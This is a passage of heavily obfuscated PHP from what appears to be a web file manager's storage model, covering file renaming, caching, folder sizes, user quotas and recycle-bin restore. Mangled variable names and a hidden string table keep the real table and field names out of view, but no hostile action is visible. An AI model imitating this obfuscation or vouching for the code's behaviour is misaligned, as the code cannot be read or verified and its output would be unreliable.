$¿ÉİÄ‰, $…Å¹ÃÕ¬[579] => USER_ID); if ($ÇÏ»Õû[$…Å¹ÃÕ¬[410]] != $…Å¹ÃÕ¬[88]) { $ìÙá¿¿[$…Å¹ÃÕ¬[412]] = substr(get_path_ext($¿ÉİÄ‰), 0, 10); } Model($…Å¹ÃÕ¬[561])->eventRename($…Ëäî“ˆ, $ÇÏ»Õû[$…Å¹ÃÕ¬[32]], $¿ÉİÄ‰); $this->sourceCacheClear($…Ëäî“ˆ); $this->setNamePinyin($…Ëäî“ˆ, $ìÙá¿¿[$…Å¹ÃÕ¬[32]], !1); $this->updateModifyTime($ÇÏ»Õû[$…Å¹ÃÕ¬[432]]); $Åéƒ†¾Ì = $this->where(array($…Å¹ÃÕ¬[417] => $…Ëäî“ˆ))->data($ìÙá¿¿)->save(); $»˜ĞÍÆ = $…Å¹ÃÕ¬[2139] . $ÇÏ»Õû[$…Å¹ÃÕ¬[432]]; if (isset(self::$cacheChildList[$»˜ĞÍÆ])) { unset(self::$cacheChildList[$»˜ĞÍÆ]); } return $Åéƒ†¾Ì; } public function setNamePinyin($˜òŒøı‘, $Ö¾œÀ„›, $µÅœ’ÊÂ = true) { $£ı®şà =& $_SERVER[­á Ş³Ö]; $ªñ¤´ù… = Input::check($Ö¾œÀ„›, $£ı®şà[583]); $ş÷ú›ñÜ = array($£ı®şà[444] => KodSort::makeStr($Ö¾œÀ„›)); if ($ªñ¤´ù…) { $ş÷ú›ñÜ[$£ı®şà[465]] = str_replace($£ı®şà[53], $£ı®şà[12], Pinyin::get($Ö¾œÀ„›)); $ş÷ú›ñÜ[$£ı®şà[464]] = Pinyin::get($Ö¾œÀ„›, $£ı®şà[584]); } if (!$µÅœ’ÊÂ && !$ªñ¤´ù…) { $ş÷ú›ñÜ[$£ı®şà[465]] = null; $ş÷ú›ñÜ[$£ı®şà[464]] = null; } $this->metaSet($˜òŒøı‘, $ş÷ú›ñÜ); } public function getContent($Ï·ØÀÕå) { $¡¯Æõôê =& $_SERVER[­á Ş³Ö]; $ËìÑ÷Óó = $this->fileInfoGet($Ï·ØÀÕå); if (!$ËìÑ÷Óó) { return !1; } if ($ËìÑ÷Óó[$¡¯Æõôê[76]] == 0) { return $¡¯Æõôê[12]; } $£Ê®€¡ = $¡¯Æõôê[2153] . $ËìÑ÷Óó[$¡¯Æõôê[176]]; if ($ËìÑ÷Óó[$¡¯Æõôê[76]] <= 1024 * 10) { $Ì´Ì´„Ş = Cache::get($£Ê®€¡); if (!$Ì´Ì´„Ş) { $Ì´Ì´„Ş = IO::getContent($ËìÑ÷Óó[$¡¯Æõôê[84]]); Cache::set($£Ê®€¡, $Ì´Ì´„Ş); } return $Ì´Ì´„Ş; } if (!$ËìÑ÷Óó[$¡¯Æõôê[84]]) { return $¡¯Æõôê[12]; } return IO::getContent($ËìÑ÷Óó[$¡¯Æõôê[84]]); } public function setDesc($Ç‘šœûğ, $³±ú¯²¥) { $ûğ»àñø =& $_SERVER[­á Ş³Ö]; Model($ûğ»àñø[561])->eventAddDesc($Ç‘šœûğ, $³±ú¯²¥); return $this->metaSet($Ç‘šœûğ, $ûğ»àñø[453], $³±ú¯²¥); } public function setContent($ã›™ˆ¹‰, $¬ÜÊÚ»å = '') { $Ú£èÄšÂ =& $_SERVER[­á Ş³Ö]; $íşä = $this->sourceInfo($ã›™ˆ¹‰); $Ò†ùÍˆ­ = $this->fileInfoGet($ã›™ˆ¹‰); if (!$Ò†ùÍˆ­ || !$íşä) { return !1; } $»ßé¬› = Model($Ú£èÄšÂ[471])->addFileByContent($¬ÜÊÚ»å, $íşä[$Ú£èÄšÂ[32]]); $½Æ¶Å›Ö = $this->fileHistory($íşä, $»ßé¬›[$Ú£èÄšÂ[468]], $»ßé¬›[$Ú£èÄšÂ[76]]); if (!$½Æ¶Å›Ö) { return Model($Ú£èÄšÂ[471])->remove($»ßé¬›[$Ú£èÄšÂ[468]]); } $this->folderSizeReset($íşä[$Ú£èÄšÂ[432]]); return !0; } public function fileSubstr($ııÑô®, $ğ“ÙôÒ¶, $µíÑÓ‚) { $‹Î‰µÃ = $this->fileInfoGet($ııÑô®); if (!$‹Î‰µÃ) { return !1; } return IO::fileSubstr($‹Î‰µÃ[$_SERVER[­á Ş³Ö][84]], $ğ“ÙôÒ¶, $µíÑÓ‚); } public function fileInfoGet($šÇÜÉıå) { $Ô‡À—½¡ =& $_SERVER[­á Ş³Ö]; $‡İøò¬Ó = $this->sourceInfo($šÇÜÉıå); if (!$‡İøò¬Ó || $‡İøò¬Ó[$Ô‡À—½¡[410]]) { return !1; } $íµÄíŒ = $Ô‡À—½¡[474] . $‡İøò¬Ó[$Ô‡À—½¡[468]]; $¿•ı¢ÄŠ = _get(self::$cacheFileInfo, $íµÄíŒ); if ($¿•ı¢ÄŠ) { return $¿•ı¢ÄŠ; } $½×”°éò = Model($Ô‡À—½¡[471])->fileInfo($‡İøò¬Ó[$Ô‡À—½¡[468]]); if ($½×”°éò) { $½×”°éò[$Ô‡À—½¡[32]] = $‡İøò¬Ó[$Ô‡À—½¡[32]]; } self::$cacheFileInfo[$íµÄíŒ] = $½×”°éò; return $½×”°éò; } private function folderChildrenNumber($ïúäÕ½ñ) { $‰Óì×ÀŒ =& $_SERVER[­á Ş³Ö]; $˜¦¦—½Ö = $this->sourceInfo($ïúäÕ½ñ); $…¾“éªÄ = array($‰Óì×ÀŒ[580] => array($‰Óì×ÀŒ[540], $˜¦¦—½Ö[$‰Óì×ÀŒ[511]] . $ïúäÕ½ñ . $‰Óì×ÀŒ[541]), $‰Óì×ÀŒ[577] => $˜¦¦—½Ö[$‰Óì×ÀŒ[496]], $‰Óì×ÀŒ[430] => intval($˜¦¦—½Ö[$‰Óì×ÀŒ[431]]), $‰Óì×ÀŒ[574] => 1); $µŠáÉ¬º = $this->where($…¾“éªÄ)->count(); $‡Ã”Åª = $this->where($…¾“éªÄ)->where(array($‰Óì×ÀŒ[574] => 0))->count(); return array($‰Óì×ÀŒ[80] => $‡Ã”Åª, $‰Óì×ÀŒ[81] => $µŠáÉ¬º); } public function pathInfo($Šë·µ, $áâ–™ = false) { $ÁÕø™˜µ =& $_SERVER[­á Ş³Ö]; $áâ–™ = !1; $Šë·µ = intval($Šë·µ); $™Ëâğ‰ø = $ÁÕø™˜µ[461] . intval($áâ–™) . $ÁÕø™˜µ[386] . $Šë·µ; $ôÍ×Û‹³ = _get(self::$cachePathInfo, $™Ëâğ‰ø); if ($ôÍ×Û‹³) { return $ôÍ×Û‹³; } $ß×ñ¡„ú = $this->sourceInfo($Šë·µ); if (!$ß×ñ¡„ú) { return !1; } $ß×ñ¡„ú = $this->_listDataApplyItem($ß×ñ¡„ú, $áâ–™); self::$cachePathInfo[$™Ëâğ‰ø] = $ß×ñ¡„ú; return $ß×ñ¡„ú; } public static $cachePathInfoMore = array(); public function pathInfoMore($ˆ¿Š©·Ğ) { $ÓñüÂç =& $_SERVER[­á Ş³Ö]; $…²ıÉ¬Ş = _get(self::$cachePathInfoMore, $ˆ¿Š©·Ğ); if ($…²ıÉ¬Ş) { return $…²ıÉ¬Ş; } $ıÃÇÈ«» = $this->pathInfo($ˆ¿Š©·Ğ); if (!$ıÃÇÈ«») { return !1; } if ($ıÃÇÈ«»[$ÓñüÂç[410]] == $ÓñüÂç[88]) { $ıÃÇÈ«»[$ÓñüÂç[79]] = $this->folderChildrenNumber($ˆ¿Š©·Ğ); } self::$cachePathInfoMore[$ˆ¿Š©·Ğ] = $ıÃÇÈ«»; return $ıÃÇÈ«»; } public function sourceInfo($Œºë”ı) { $ıî½“‡ş =& $_SERVER[­á Ş³Ö]; if (!$Œºë”ı) { return array(); } $Œºë”ı = intval($Œºë”ı); $­Ó‘‚è­ = $ıî½“‡ş[460] . $Œºë”ı; $åïºÎúÑ = _get(self::$cacheSourceInfo, $­Ó‘‚è­); if ($åïºÎúÑ) { return $åïºÎúÑ; } $‚ü¥Ï™ˆ = $this->where(array($ıî½“‡ş[402] => $Œºë”ı))->find(); self::$cacheSourceInfo[$­Ó‘‚è­] = $‚ü¥Ï™ˆ; return self::$cacheSourceInfo[$­Ó‘‚è­]; } public function sourceCacheClear($Ğ’Æõ—á = false) { self::cacheClear($Ğ’Æõ—á); } public static function cacheClear($‚ãÏ¼¥ê = false) { $±œ‡ğ£Å =& $_SERVER[­á Ş³Ö]; if ($‚ãÏ¼¥ê == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$±œ‡ğ£Å[460] . $‚ãÏ¼¥ê]); unset(self::$cachePathInfoMore[$‚ãÏ¼¥ê]); unset(self::$cachePathInfo[$±œ‡ğ£Å[2154] . $‚ãÏ¼¥ê]); unset(self::$cachePathInfo[$±œ‡ğ£Å[2155] . $‚ãÏ¼¥ê]); } public function metaSet($ˆ»ßÖ”À, $¡ËèÈºÇ = null, $¼Ë’óßÓ = null) { $ğ‘Ê§æÊ = parent::metaSet($ˆ»ßÖ”À, $¡ËèÈºÇ, $¼Ë’óßÓ); if ($ğ‘Ê§æÊ) { $this->sourceCacheClear($ˆ»ßÖ”À); } return $ğ‘Ê§æÊ; } public function pathInfoByPath($¾ÌÌ‹¾î, $ëƒ‰ôƒÂ) { $´şƒ“‡ø =& $_SERVER[­á Ş³Ö]; $‚î‚Ìæã = !$ëƒ‰ôƒÂ ? array() : explode($´şƒ“‡ø[8], trim($ëƒ‰ôƒÂ, $´şƒ“‡ø[8])); $…ÌéŞ÷› = $¾ÌÌ‹¾î; foreach ($‚î‚Ìæã as $šùîÏ°Œ) { $òçÃõÈÉ = array($´şƒ“‡ø[432] => $…ÌéŞ÷›, $´şƒ“‡ø[32] => $šùîÏ°Œ); $úâßÄ¯Ğ = $this->where($òçÃõÈÉ)->select(); if (!$úâßÄ¯Ğ) { return !1; } $úâßÄ¯Ğ = array_sort_by($úâßÄ¯Ğ, $´şƒ“‡ø[431]); $…ÌéŞ÷› = $úâßÄ¯Ğ[0][$´şƒ“‡ø[402]]; } return $this->pathInfo($…ÌéŞ÷›, !0); } protected function updateModifyTime($˜»İëË) { $êÏĞàØ =& $_SERVER[­á Ş³Ö]; if (!$˜»İëË) { return; } if (!is_array($˜»İëË)) { $˜»İëË = array($˜»İëË); } foreach ($˜»İëË as $•Ôä«ç¦ => $ä™ıºèÉ) { $˜»İëË[$•Ôä«ç¦] = intval($ä™ıºèÉ); $this->sourceCacheClear($ä™ıºèÉ); } $¦Ø¼°ÁÁ = array($êÏĞàØ[402] => array($êÏĞàØ[7], $˜»İëË)); $„õ¡À = array($êÏĞàØ[579] => USER_ID, $êÏĞàØ[424] => time()); $this->where($¦Ø¼°ÁÁ)->save($„õ¡À); } public function folderSizeReset($Ì€‹çÙñ, $†˜àæù = false) { $ùìÊâĞß =& $_SERVER[­á Ş³Ö]; if ($this->statusIgnoreResetSpace) { return; } $ÃÎÂÅ… = $this->sourceInfo($Ì€‹çÙñ); $¡×ŒªŒË = $ùìÊâĞß[2156] . $Ì€‹çÙñ; CacheLock::lock($¡×ŒªŒË, 20); if ($†˜àæù === !1) { $this->sourceCacheClear($Ì€‹çÙñ); $ÃÎÂÅ… = $this->sourceInfo($Ì€‹çÙñ); $ò™ŠØÈ = array($ùìÊâĞß[401] => $Ì€‹çÙñ, $ùìÊâĞß[430] => 0); $Î™¼§¾í = $this->where($ò™ŠØÈ)->sum($ùìÊâĞß[76]); $†˜àæù = intval($Î™¼§¾í) - intval($ÃÎÂÅ…[$ùìÊâĞß[76]]); } if ($†˜àæù == 0) { return CacheLock::unlock($¡×ŒªŒË); } $“£ïû°ã = $this->parentLevelArray($ÃÎÂÅ…[$ùìÊâĞß[511]]); if (!$“£ïû°ã) { $“£ïû°ã = array(); } $“£ïû°ã[] = $ÃÎÂÅ…[$ùìÊâĞß[402]]; $ò™ŠØÈ = array($ùìÊâĞß[402] => array($ùìÊâĞß[418], $“£ïû°ã)); if ($†˜àæù < 0) { $ò™ŠØÈ[$ùìÊâĞß[76]] = array($ùìÊâĞß[1011], abs($†˜àæù)); } $this->where($ò™ŠØÈ)->setAdd($ùìÊâĞß[76], $†˜àæù); CacheLock::unlock($¡×ŒªŒË); $¸êµ…¬å = $ùìÊâĞß[2157] . $ÃÎÂÅ…[$ùìÊâĞß[411]] . $ùìÊâĞß[4] . $ÃÎÂÅ…[$ùìÊâĞß[496]]; $şÎŒµŠ† = array($ÃÎÂÅ…[$ùìÊâĞß[411]], $ÃÎÂÅ…[$ùìÊâĞß[496]]); TaskRun::timeLimitCall($¸êµ…¬å, $ùìÊâĞß[2158], $şÎŒµŠ†, 1.5); } public function folderSizeResetChildren($¦ıÆ–) { $™¿ùá¶¢ =& $_SERVER[­á Ş³Ö]; $this->sourceCacheClear($¦ıÆ–); $¯ ‚è‘ = $this->sourceInfo($¦ıÆ–); $Ğ’Ô„ış = array($™¿ùá¶¢[574] => 1, $™¿ùá¶¢[577] => $¯ ‚è‘[$™¿ùá¶¢[496]], $™¿ùá¶¢[580] => array($™¿ùá¶¢[540], $¯ ‚è‘[$™¿ùá¶¢[511]] . $¦ıÆ– . $™¿ùá¶¢[541])); $á»¬äÎª = $™¿ùá¶¢[2159]; $™ôîú­… = $this->field($á»¬äÎª)->where($Ğ’Ô„ış)->select(); $Ğ’Ô„ış[$™¿ùá¶¢[410]] = 0; $…ÅôÛ“ó = $this->field($á»¬äÎª)->where($Ğ’Ô„ış)->select(); if (!$…ÅôÛ“ó) { return; } $™ôîú­…[] = $¯ ‚è‘; $™ôîú­… = array_to_keyvalue($™ôîú­…, $™¿ùá¶¢[402]); foreach ($™ôîú­… as $ì¶¼êÓÂ => $œ‡ğŞÕ§) { $™ôîú­…[$ì¶¼êÓÂ][$™¿ùá¶¢[2160]] = $™ôîú­…[$ì¶¼êÓÂ][$™¿ùá¶¢[76]]; $™ôîú­…[$ì¶¼êÓÂ][$™¿ùá¶¢[76]] = 0; } foreach ($…ÅôÛ“ó as $œ‡ğŞÕ§) { $½‚Êì¡ = $œ‡ğŞÕ§[$™¿ùá¶¢[432]] . $™¿ùá¶¢[12]; if (!isset($™ôîú­…[$½‚Êì¡])) { continue; } if ($œ‡ğŞÕ§[$™¿ùá¶¢[431]] == $™ôîú­…[$½‚Êì¡][$™¿ùá¶¢[431]]) { $™ôîú­…[$½‚Êì¡][$™¿ùá¶¢[76]] += $œ‡ğŞÕ§[$™¿ùá¶¢[76]]; } } foreach ($™ôîú­… as $œ‡ğŞÕ§) { $«›õ¸ƒ = $this->parentLevelArray($œ‡ğŞÕ§[$™¿ùá¶¢[511]]); foreach ($«›õ¸ƒ as $½‚Êì¡) { $½‚Êì¡ = $½‚Êì¡ . $™¿ùá¶¢[12]; if (!isset($™ôîú­…[$½‚Êì¡])) { continue; } if ($œ‡ğŞÕ§[$™¿ùá¶¢[431]] == $™ôîú­…[$½‚Êì¡][$™¿ùá¶¢[431]]) { $™ôîú­…[$½‚Êì¡][$™¿ùá¶¢[76]] += $œ‡ğŞÕ§[$™¿ùá¶¢[76]]; } } } $…·Ÿ£ëè = array(); foreach ($™ôîú­… as $œ‡ğŞÕ§) { if ($œ‡ğŞÕ§[$™¿ùá¶¢[76]] == $œ‡ğŞÕ§[$™¿ùá¶¢[2160]]) { continue; } $…·Ÿ£ëè[] = array($™¿ùá¶¢[402], $œ‡ğŞÕ§[$™¿ùá¶¢[402]], $™¿ùá¶¢[76], $œ‡ğŞÕ§[$™¿ùá¶¢[76]]); } $this->saveAll($…·Ÿ£ëè); } public function userSpaceReset($œåçÁÇ¶ = false) { $Ùš‘ÑºÃ =& $_SERVER[­á Ş³Ö]; $ìáï¬§ê = $this->where(array($Ùš‘ÑºÃ[411] => self::TYPE_USER, $Ùš‘ÑºÃ[496] => $œåçÁÇ¶, $Ùš‘ÑºÃ[410] => 0))->sum($Ùš‘ÑºÃ[76]); $ìáï¬§ê = !$ìáï¬§ê || $ìáï¬§ê <= 0 ? 0 : $ìáï¬§ê; Model($Ùš‘ÑºÃ[504])->userEdit($œåçÁÇ¶, array($Ùš‘ÑºÃ[1841] => $ìáï¬§ê)); } public function targetSpaceUpdate($ˆñõÜï, $¿¬¿äØ) { $÷ŠÊˆ‰” =& $_SERVER[­á Ş³Ö]; if (!$¿¬¿äØ) { return; } if (!in_array($ˆñõÜï, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $´ÁÊŸÕ¦ = $this->targetSpaceSize($ˆñõÜï, $¿¬¿äØ); if ($ˆñõÜï == self::TYPE_USER) { Model($÷ŠÊˆ‰”[504])->userEdit($¿¬¿äØ, array($÷ŠÊˆ‰”[1841] => $´ÁÊŸÕ¦)); } else { if ($ˆñõÜï == self::TYPE_GROUP) { Model($÷ŠÊˆ‰”[512])->groupEdit($¿¬¿äØ, array($÷ŠÊˆ‰”[1841] => $´ÁÊŸÕ¦)); } } } public function targetSpaceSize($°£œØğÌ, $³´ŠÆï) { $˜¼‘Œ´„ =& $_SERVER[­á Ş³Ö]; $¹³¾Ù†á = 0; $»„¯˜â = $this->targetSourceRoot($°£œØğÌ, $³´ŠÆï, !0); foreach ($»„¯˜â as $‹Ñû¸¹Õ) { if (!$‹Ñû¸¹Õ) { continue; } $¹³¾Ù†á += floatval($‹Ñû¸¹Õ[$˜¼‘Œ´„[76]]); $òÖáï˜² = array($˜¼‘Œ´„[580] => array($˜¼‘Œ´„[540], $˜¼‘Œ´„[521] . $‹Ñû¸¹Õ[$˜¼‘Œ´„[402]] . $˜¼‘Œ´„[541])); $—ÖíŞÁ = Model($˜¼‘Œ´„[429])->field($˜¼‘Œ´„[417])->where($òÖáï˜²)->select(); $—ÖíŞÁ = array_to_keyvalue($—ÖíŞÁ, $˜¼‘Œ´„[12], $˜¼‘Œ´„[402]); $—ÖíŞÁ = array_unique(array_filter($—ÖíŞÁ)); if ($—ÖíŞÁ) { $òÖáï˜² = array($˜¼‘Œ´„[417] => array($˜¼‘Œ´„[418], $—ÖíŞÁ)); $¹³¾Ù†á += floatval($this->where($òÖáï˜²)->sum($˜¼‘Œ´„[76])); } } $¹³¾Ù†á = !$¹³¾Ù†á || $¹³¾Ù†á <= 0 ? 0 : $¹³¾Ù†á; return $¹³¾Ù†á; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ğ‘×Š°ä) { return $this->fileTypeProfile($ğ‘×Š°ä, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ÙôÄ‡»È) { return $this->fileTypeProfile($ÙôÄ‡»È, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ Ô¨­„ª, $ÜÑƒÚŒ°) { $óî¿È­º =& $_SERVER[­á Ş³Ö]; $şÇ•è¢ = $óî¿È­º[2161] . $ Ô¨­„ª . $óî¿È­º[11] . $ÜÑƒÚŒ°; $È²øØæÚ = Cache::get($şÇ•è¢); if ($È²øØæÚ) { return $È²øØæÚ; } $ßÆ¶¶Üï = array($óî¿È­º[574] => 0); if ($ Ô¨­„ª != !1) { $ßÆ¶¶Üï[$óî¿È­º[496]] = $ Ô¨­„ª; $ßÆ¶¶Üï[$óî¿È­º[411]] = $ÜÑƒÚŒ°; } $ê¿Ş¦ıŸ = array(); $ê¿Ş¦ıŸ[$óî¿È­º[2162]] = array($óî¿È­º[2163] => LNG($óî¿È­º[2162]), $óî¿È­º[2164] => $this->where($ßÆ¶¶Üï)->count(), $óî¿È­º[545] => $this->where($ßÆ¶¶Üï)->sum($óî¿È­º[76])); $ú¯‡©³â = KodIO::fileTypeList(); foreach ($ú¯‡©³â as $Úü¼Œà => $Üïß‹ıî) { $ßÆ¶¶Üï[$óî¿È­º[412]] = $this->fileTypeWhere($Úü¼Œà); $ê¿Ş¦ıŸ[$Úü¼Œà] = array($óî¿È­º[2163] => $Üïß‹ıî[$óî¿È­º[32]], $óî¿È­º[2164] => $this->where($ßÆ¶¶Üï)->count(), $óî¿È­º[545] => $this->where($ßÆ¶¶Üï)->sum($óî¿È­º[76])); } Cache::set($şÇ•è¢, $ê¿Ş¦ıŸ, 1200); return $ê¿Ş¦ıŸ; } public function fileNameExist($ş«º²º‹, $Ü±¡íëÌ) { $Á‡í¯˜­ =& $_SERVER[­á Ş³Ö]; $Ù¶ƒ–…§ = $this->where(array($Á‡í¯˜­[432] => $ş«º²º‹, $Á‡í¯˜­[32] => $Ü±¡íëÌ, $Á‡í¯˜­[431] => 0))->find(); return is_array($Ù¶ƒ–…§) ? $Ù¶ƒ–…§[$Á‡í¯˜­[402]] : !1; } public function childList($‹¼Çä®˜) { $»¨Ÿº“ò =& $_SERVER[­á Ş³Ö]; $şãç¶Ìç = $»¨Ÿº“ò[2139] . $‹¼Çä®˜; if (isset(self::$cacheChildList[$şãç¶Ìç])) { return self::$cacheChildList[$şãç¶Ìç]; } $—¤ˆÉ˜ = array($»¨Ÿº“ò[432] => intval($‹¼Çä®˜), $»¨Ÿº“ò[431] => 0); $Ã·•“¡° = $this->where($—¤ˆÉ˜)->select(); $Ã·•“¡° = $Ã·•“¡° ? $Ã·•“¡° : array(); self::$cacheChildList[$şãç¶Ìç] = $Ã·•“¡°; foreach ($Ã·•“¡° as $œ“¯õª) { $şãç¶Ìç = $»¨Ÿº“ò[460] . $œ“¯õª[$»¨Ÿº“ò[402]]; self::$cacheSourceInfo[$şãç¶Ìç] = $œ“¯õª; } return $Ã·•“¡°; } public function fileNameAuto($ù¢«ûÇÃ, $œ¸ñøõ, $…ê†Ï®Ä = REPEAT_RENAME, $«ç›¼®Ş = false) { $¡õÙÏÔ« =& $_SERVER[­á Ş³Ö]; $å…‰•»í = get_path_ext($œ¸ñøõ); $Ùöê»çí = $å…‰•»í ? basename($œ¸ñøõ, $¡õÙÏÔ«[10] . $å…‰•»í) . $¡õÙÏÔ«[2165] . $å…‰•»í : $œ¸ñøõ . $¡õÙÏÔ«[384]; $‡Îİşª = array($¡õÙÏÔ«[432] => $ù¢«ûÇÃ, $¡õÙÏÔ«[431] => 0, $¡õÙÏÔ«[32] => array($¡õÙÏÔ«[383], $Ùöê»çí)); $¼ûÄìÙÌ = $this->field($¡õÙÏÔ«[32])->where($‡Îİşª)->select(); $Ğ°“Ú¢® = array_to_keyvalue($¼ûÄìÙÌ, $¡õÙÏÔ«[12], $¡õÙÏÔ«[32]); return $this->fileNameAutoGet($Ğ°“Ú¢®, $œ¸ñøõ, $…ê†Ï®Ä, $«ç›¼®Ş); } public function fileNameAutoGet($ÖòØÊÉ«, $û¦ñİó, $áÉûÜ£›, $î¿í¾œ¢) { $Ûì‰±…Æ =& $_SERVER[­á Ş³Ö]; if ($áÉûÜ£› == REPEAT_REPLACE || !$ÖòØÊÉ« || !in_array_not_case($û¦ñİó, $ÖòØÊÉ«) || $î¿í¾œ¢ && $áÉûÜ£› != REPEAT_RENAME_FOLDER) { return $û¦ñİó; } if ($áÉûÜ£› == REPEAT_SKIP) { return !1; } $Ö‚Š„·Ú = $Ûì‰±…Æ[10] . get_path_ext($û¦ñİó); $Ö‚Š„·Ú = $Ö‚Š„·Ú == $Ûì‰±…Æ[10] || $î¿í¾œ¢ ? $Ûì‰±…Æ[12] : $Ö‚Š„·Ú; for ($öÙ²ô–¤ = 1; $öÙ²ô–¤ <= count($ÖòØÊÉ«) + 1; $öÙ²ô–¤++) { $¦Æç„Ê® = substr($û¦ñİó, 0, strlen($û¦ñİó) - strlen($Ö‚Š„·Ú)); $óï¨¿Õ° = $¦Æç„Ê® . "\50{$öÙ²ô–¤}\51{$Ö‚Š„·Ú}"; if (!in_array_not_case($óï¨¿Õ°, $ÖòØÊÉ«)) { return $óï¨¿Õ°; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\143\x65\137\x72\x65\x63\171\143\154\145"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\155\x65", "\x74\151\155\x65", "\151\x6e\163\x65\x72\164", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public function listData($ıüş°ßÓ = false) { $—úÜÂˆ =& $_SERVER[­á Ş³Ö]; $ıüş°ßÓ = $ıüş°ßÓ ? $ıüş°ßÓ : USER_ID; $ÆÔÅÏöú = $this->where(array($—úÜÂˆ[1654] => $ıüş°ßÓ))->select(); return array_to_keyvalue($ÆÔÅÏöú, $—úÜÂˆ[12], $—úÜÂˆ[402]); } public function moveToRecycle($”§Í²å) { $Ê¨¾¸˜ =& $_SERVER[­á Ş³Ö]; $ÏéÔµ¼ = Model($Ê¨¾¸˜[1335]); $’¿÷¾â = $ÏéÔµ¼->sourceInfo($”§Í²å); if (!$’¿÷¾â || $’¿÷¾â[$Ê¨¾¸˜[431]] == $Ê¨¾¸˜[88]) { return; } $ÃµŒØ© = array($Ê¨¾¸˜[417] => $”§Í²å, $Ê¨¾¸˜[1654] => USER_ID, $Ê¨¾¸˜[576] => $’¿÷¾â[$Ê¨¾¸˜[411]], $Ê¨¾¸˜[577] => $’¿÷¾â[$Ê¨¾¸˜[496]], $Ê¨¾¸˜[580] => $’¿÷¾â[$Ê¨¾¸˜[511]]); $this->add($ÃµŒØ©); $this->recycleMove($”§Í²å, 1); if ($’¿÷¾â[$Ê¨¾¸˜[410]] == $Ê¨¾¸˜[88]) { $ˆòÌ¾Âª = array($Ê¨¾¸˜[580] => array($Ê¨¾¸˜[540], $’¿÷¾â[$Ê¨¾¸˜[511]] . $”§Í²å . $Ê¨¾¸˜[541])); $ÏéÔµ¼->where($ˆòÌ¾Âª)->setField($Ê¨¾¸˜[431], 1); } } public function clear() { $this->remove(!1); } public function remove($½˜õ¸¸ø = false, $Ïå½®é¤ = false) { $ØØËª­ =& $_SERVER[­á Ş³Ö]; $Ïå½®é¤ = $Ïå½®é¤ ? $Ïå½®é¤ : USER_ID; $›ĞÂïÀ° = Model($ØØËª­[1335]); $ÔÏ¦„ô° = $this->listData($Ïå½®é¤); $½˜õ¸¸ø = $½˜õ¸¸ø === !1 ? !1 : $½˜õ¸¸ø; $½ìÁñ²ü = array(); foreach ($ÔÏ¦„ô° as $¥Æ€—µ¼) { if ($½˜õ¸¸ø != !1 && !in_array($¥Æ€—µ¼, $½˜õ¸¸ø)) { continue; } $§˜”˜£¿ = $›ĞÂïÀ°->sourceInfo($¥Æ€—µ¼); $›ĞÂïÀ°->remove($¥Æ€—µ¼, !1); $¶œÓÙ¢Ä = $§˜”˜£¿[$ØØËª­[411]] . $ØØËª­[11] . $§˜”˜£¿[$ØØËª­[496]]; $½ìÁñ²ü[$¶œÓÙ¢Ä] = array($ØØËª­[576] => $§˜”˜£¿[$ØØËª­[411]], $ØØËª­[496] => $§˜”˜£¿[$ØØËª­[496]]); $this->where(array($ØØËª­[402] => $¥Æ€—µ¼))->delete(); } foreach ($½ìÁñ²ü as $ìª±‚œ) { $›ĞÂïÀ°->targetSpaceUpdate($ìª±‚œ[$ØØËª­[411]], $ìª±‚œ[$ØØËª­[496]]); } } public function restore($ ë¿â¶¯ = false) { $òÅÎ†¸ = $this->listData(); $this->_restoreSource($òÅÎ†¸, $ ë¿â¶¯); } public function removeUserAll($¼ÊşÄî…) { $this->remove(!1, $¼ÊşÄî…); } private function _restoreSource($İ’à—Ñ°, $¬òññœì) { $ÅĞ‘›Üñ =& $_SERVER[­á Ş³Ö]; $¾¼‡×Ğ“ = Model($ÅĞ‘›Üñ[1335]); $¬òññœì = $¬òññœì == !1 ? !1 : $¬òññœì; if (!$İ’à—Ñ°) { return !0; } $¿ÁŞ‚·Ğ = array(); foreach ($İ’à—Ñ° as $¯ÍˆÂÀÆ) { if ($¬òññœì != !1 && !in_array($¯ÍˆÂÀÆ, $¬òññœì)) { continue; } $˜·œ»æ‚ = $¾¼‡×Ğ“->sourceInfo($¯ÍˆÂÀÆ); $óÈ…èÔñ = $¾¼‡×Ğ“->sourceInfo($˜·œ»æ‚[$ÅĞ‘›Üñ[432]]); if ($óÈ…èÔñ[$ÅĞ‘›Üñ[431]] == $ÅĞ‘›Üñ[88]) { continue; } $¾¼‡×Ğ“->lockMoveStart($¯ÍˆÂÀÆ); $this->recycleMove($¯ÍˆÂÀÆ, 0); if ($˜·œ»æ‚[$ÅĞ‘›Üñ[410]] == $ÅĞ‘›Üñ[88]) { $ı³ıÏºÖ = array($ÅĞ‘›Üñ[580] => array($ÅĞ‘›Üñ[540], $˜·œ»æ‚[$ÅĞ‘›Üñ[511]] . $¯ÍˆÂÀÆ . $ÅĞ‘›Üñ[541])); $¾¼‡×Ğ“->where($ı³ıÏºÖ)->setField($ÅĞ‘›Üñ[431], 0); $this->restoreFolderChildren($¯ÍˆÂÀÆ, $İ’à—Ñ°); } $this->where(array($ÅĞ‘›Üñ[402] => $¯ÍˆÂÀÆ))->delete(); $¾¼‡×Ğ“->folderSizeReset($˜·œ»æ‚[$ÅĞ‘›Üñ[432]]); $¿ÁŞ‚·Ğ[] = $˜·œ»æ‚[$ÅĞ‘›Üñ[432]]; if ($˜·œ»æ‚[$ÅĞ‘›Üñ[410]] == $ÅĞ‘›Üñ[88]) { $¿ÁŞ‚·Ğ[] = $¯ÍˆÂÀÆ; } $¾¼‡×Ğ“->lockMoveEnd($¯ÍˆÂÀÆ); } $¾¼‡×Ğ“->updateModifyTime($¿ÁŞ‚·Ğ); } private function restoreFolderChildren($…¦È¤¹°, $Û´¯¨Ì) { $Ç»·Â¥‘ =& $_SERVER[­á Ş³Ö]; $½›’û‚Ğ = Model($Ç»·Â¥‘[1335]); $ñ¾ğ˜‰´ = array($Ç»·Â¥‘[402] => array($Ç»·Â¥‘[7], array())); foreach ($Û´¯¨Ì as $êß«¯°§) { if ($êß«¯°§ == $…¦È¤¹°) { continue; 